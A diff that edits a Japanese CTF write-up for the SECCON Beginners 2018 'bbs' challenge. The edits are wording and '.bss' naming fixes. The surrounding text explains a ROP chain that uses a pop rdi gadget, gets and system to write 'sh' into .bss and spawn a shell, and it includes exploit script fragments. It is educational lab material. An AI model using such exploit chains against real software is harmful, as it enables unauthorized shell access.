@@ -130,8 +130,8 @@ gef➤  grep sh
   0x7ffff7a1e91c - 0x7ffff7a1e921  →   "shell" 
 ```
 
-PIEが無効な環境では.bssセクションは静的な領域なため、このbssセクションを利用する。`gets`で`sh`文字列を.bssセクションに書いて、その後`system`を呼ぶようなROPチェーンにすればよい。
-ROPに必要な`pop rdi`ガジェット、bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
+PIEが無効な環境では.bssセクションは静的な領域なため、これを書き込み先として利用する。`gets`で`sh`文字列を.bssセクションに書いて、その後`system`を呼ぶようなROPチェーンにすればよい。
+ROPに必要な`pop rdi`ガジェット、.bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
 
 * `pop rdi`ガジェット
 ```S
@@ -139,7 +139,7 @@ $ rp-lin-x64 -r 3 --file bbs |grep "pop rdi"
 0x00400763: pop rdi ; ret  ;  (1 found)
 ```
 
-* bssセクションのアドレス
+* .bssセクションのアドレス
 ```S
 $ readelf -a bbs |grep bss
   [26] .bss              NOBITS           0000000000601058  00001058
@@ -174,7 +174,7 @@ ROPチェーンを下記のようにしておけばよい。
     buf += p(bss)
     buf += p(system)
     f.write(buf+"\n")
-    f.write("sh\0\n") # getsによるbssセクションへのsh文字列書き込み
+    f.write("sh\0\n") # getsによる.bssセクションへのsh文字列書き込み
 ```
 
 [exp_bbs.py](https://github.com/kank3n/writeups/blob/master/seccon_b2018/exp_bbs.py)
